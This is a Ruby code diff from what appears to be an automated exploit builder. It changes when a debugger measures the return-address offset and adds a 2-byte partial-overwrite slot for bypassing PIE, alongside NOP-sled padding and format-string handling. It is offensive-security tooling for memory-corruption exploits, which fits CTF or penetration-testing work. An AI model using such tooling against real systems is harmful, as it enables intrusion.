@@ -44,17 +44,16 @@ module Lictor
       end
       offset = static&.dig(:offset)
       offset_source = offset ? "static-frame" : nil
-      unless offset
-        offset = AugureProfiler::Triage.offset(binary)
-        offset_source = "gdb-cyclic" if offset
-      end
-
       layouts = layouts_for(technique, packs)
       # the measured offset serves the return-slot layouts only: the
       # fmtstr class addresses the stack through the format itself, the
       # fmt_offset fact carries the buffer's argument index - no return
       # slot to measure
       needs_offset = layouts.any? { |(_, layout)| layout.flatten.include?("measured_offset") }
+      if needs_offset && !offset
+        offset = AugureProfiler::Triage.offset(binary)
+        offset_source = "gdb-cyclic" if offset
+      end
       unless offset || !needs_offset
         raise BuildError,
           "no measured offset - static analysis found no controlled return and the debugger did not either"
@@ -134,10 +133,11 @@ module Lictor
         when "padding"
           filler = (slot[2] == "sled") ? "\x90" : "A"
           body << (filler * offset).b
-        when "qword", "dword"
+        when "qword", "dword", "word"
           # dword is 4 bytes WHATEVER the arch (a partial overwrite);
+          # word is 2 bytes (the PIE page hop: the low 16 bits only);
           # qword is the arch's pointer width (8 on x64, 4 on x86)
-          slot_width = (slot[0] == "dword") ? "L<" : width
+          slot_width = {"dword" => "L<", "word" => "S<"}[slot[0]] || width
           value, source = resolve_addr(facts, slot[1], slot_width)
           ret ||= value
           ret_source ||= source
